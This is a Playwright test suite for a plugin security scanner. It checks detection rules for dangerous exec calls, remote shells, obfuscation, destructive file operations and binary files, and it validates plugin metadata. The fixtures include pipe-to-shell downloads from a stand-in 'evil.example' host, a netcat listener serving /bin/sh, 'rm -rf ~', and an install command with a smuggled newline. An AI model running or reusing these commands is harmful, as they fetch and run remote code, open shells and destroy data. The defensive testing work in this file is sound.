import { test, expect } from "@playwright/test";
import { computeRisk, runScans, runSecurityScan, runValidation, toExtractedFiles, type ExtractedFile } from "../../lib/scan";

const txt = (name: string, text: string): ExtractedFile => ({ name, size: text.length, text });
const scan = (files: ExtractedFile[], extra?: { name: string; text: string }[]) =>
  runSecurityScan(files, { extra });
const has = (files: ExtractedFile[], rule: string, extra?: { name: string; text: string }[]) =>
  scan(files, extra).findings.some((f) => f.rule === rule);

const CASES: [string, boolean, string[]][] = [
  ["dangerous-exec", true, [`const { exec } = require("child_process");`, `import { spawn } from "node:child_process";`, `exec("rm -rf ~")`, `spawn("sh", ["-c", cmd])`, `child_process.exec("ls")`, `execSync("ls")`, `subprocess.run(["ls"])`, `os.system("ls")`, `eval(code)`, `new Function("return 1")`, `exec.Command("ls")`, `Runtime.getRuntime().exec(cmd)`, `Invoke-Expression $x`, `await import("child_process")`, `import cp from 'child_process'`, `os.popen("ls")`]],
  ["dangerous-exec", false, [`const m = /a/.exec(str);`, `pattern.exec(line)`, `obj.spawn(x)`, `const executor = 1;`, `myexec(1)`, `evaluate(x)`, `$exec(1)`]],
  ["remote-shell", true, [`curl -s https://x | bash`, `wget -qO- https://x | sh`, `curl -fsSL https://x | sudo bash`, `curl -o i.sh https://x && bash i.sh`, `bash <(curl -s https://x)`, `iwr https://x | iex`, `nc -lvp 4444 -e /bin/sh`]],
  ["remote-shell", false, [`curl https://api.example.com/data -o data.json`, `echo hi | bash`, `wget https://x/file.tar.gz`, `const curlOpts = 1; // | bashful`]],
  ["obfuscation", true, [`String.fromCharCode(104,101,108,108,111,32,119,111)`, `atob(payload)`, `"\\x68\\x65\\x6c\\x6c\\x6f\\x77\\x6f\\x72"`, `__import__("os")`]],
  ["fs-write", true, [`open("out.txt", "w")`, `open(path, 'ab+')`, `fs.writeFileSync(p, d)`]],
  ["fs-destructive", true, [`rm -rf /tmp/x`, `rm -fr ./build`, `shutil.rmtree(d)`]],
];

for (const [rule, expected, lines] of CASES) {
  test(`${rule}: ${expected ? "matches" : "non-matches"}`, () => {
    for (const line of lines) {
      expect(has([txt("f.js", line)], rule), `${rule} on ${line}`).toBe(expected);
    }
  });
}

test("ReDoS guard: 200 KB hostile lines scan fast", () => {
  const frags = ["curl ", "wget ", "open(", "String.fromCharCode(", "String.fromCharCode(1,", "rm -", "token ", "-----BEGIN ", "http://", "nc ", "exec ", "require(", "| ", "bash ", "\\x4", "atob ", "fs.", "Remove-Item ", "a", " "];
  for (const f of frags) {
    const line = f.repeat(Math.ceil(200_000 / f.length)).slice(0, 200_000);
    const t = performance.now();
    scan([txt("big.js", line)]);
    expect(performance.now() - t, `fragment ${JSON.stringify(f)}`).toBeLessThan(500);
  }
});

const bin = (name: string, hexMagic: string, size = 64): ExtractedFile => {
  const data = Buffer.alloc(size);
  Buffer.from(hexMagic, "hex").copy(data);
  return { name, size, text: null, magic: data.subarray(0, 8).toString("hex") };
};

test("binary classification: ELF magic, .node ext, nested zip, aggregated images", () => {
  const files = [
    bin("native.addon", "7f454c4602010100"), // ELF via magic
    bin("native.node", "89504e470d0a1a0a"), // .node via ext
    bin("pkg.whl", "504b030414000000"), // nested via ext+magic
    bin("img1.png", "89504e470d0a1a0a"),
    bin("img2.png", "89504e470d0a1a0a"),
    bin("img3.png", "89504e470d0a1a0a"),
  ];
  const { findings } = scan(files);
  expect(findings.filter((f) => f.rule === "binary-executable").length).toBe(2);
  expect(findings.filter((f) => f.rule === "nested-archive").length).toBe(1);
  const low = findings.filter((f) => f.rule === "binary-file");
  expect(low.length).toBe(1);
  expect(low[0].occurrences).toBe(3);
});

test("NUL-containing evil.js is still scanned (text-like ext wins)", () => {
  const f = toExtractedFiles([{ name: "evil.js", data: Buffer.concat([Buffer.from("eval(x)"), Buffer.from([0, 1, 2])]) }]);
  expect(f[0].text).not.toBeNull();
  expect(has(f, "dangerous-exec")).toBe(true);
});

test("extensionless #!/bin/sh script is scanned", () => {
  const f = toExtractedFiles([{ name: "bin/install", data: Buffer.from("#!/bin/sh\ncurl -s https://evil.example/x | bash\n") }]);
  expect(f[0].text).not.toBeNull();
  expect(has(f, "remote-shell")).toBe(true);
});

test("install command scanned via extra → remote-shell on 'install command'", () => {
  const { findings } = scan([], [{ name: "install command", text: "curl -s https://evil.example/x | bash" }]);
  expect(findings.some((f) => f.rule === "remote-shell" && f.file === "install command")).toBe(true);
});

test("risk: one high finding and no permissions → high", () => {
  expect(computeRisk([], { low: 0, medium: 0, high: 1 }).level).toBe("high");
});

test("budgetMs: 0 → scan-incomplete", () => {
  const { findings } = runSecurityScan([txt("a.js", "eval(x)")], { budgetMs: 0 });
  expect(findings.some((f) => f.rule === "scan-incomplete" && f.severity === "high")).toBe(true);
});

test("validation: bad type, non-semver, newline install command all fail", () => {
  const meta = { name: "Test Plugin", type: "nonsense", version: "1.0.0 anything", summary: "A valid summary", permissions: [], installCommand: "amp install x\nevil" };
  const report = runScans([], meta);
  expect(report.ok).toBe(false);
  const ids = report.validation.filter((c) => c.severity === "error" && !c.passed).map((c) => c.id);
  expect(ids).toContain("meta-type");
  expect(ids).toContain("meta-version");
  expect(ids).toContain("meta-install");
});

const find = (files: ExtractedFile[], meta: Parameters<typeof runValidation>[1], id: string) =>
  runValidation(files, meta).find((c) => c.id === id);
const mcpMeta = (type = "mcp") => ({ name: "T", type, version: "1.0.0", summary: "s", permissions: [] as string[] });

test("manifest-server: valid server block passes", () => {
  const files = [txt("mcp.json", JSON.stringify({ name: "x", server: { command: "node", args: ["${PLUGIN_DIR}/src/i.ts"], env: ["GITHUB_TOKEN"] } }))];
  const c = find(files, mcpMeta(), "manifest-server");
  expect(c?.passed).toBe(true);
});

test("manifest-server: bad env name errors", () => {
  const files = [txt("mcp.json", JSON.stringify({ name: "x", server: { command: "node", env: ["not-ok"] } }))];
  const c = find(files, mcpMeta(), "manifest-server");
  expect(c?.passed).toBe(false);
  expect(c?.severity).toBe("error");
});

test("manifest-server: mcp without server warns", () => {
  const files = [txt("mcp.json", JSON.stringify({ name: "x" }))];
  const c = find(files, mcpMeta(), "manifest-server");
  expect(c?.passed).toBe(false);
  expect(c?.severity).toBe("warning");
  expect(c?.message).toContain("No server launch command");
});
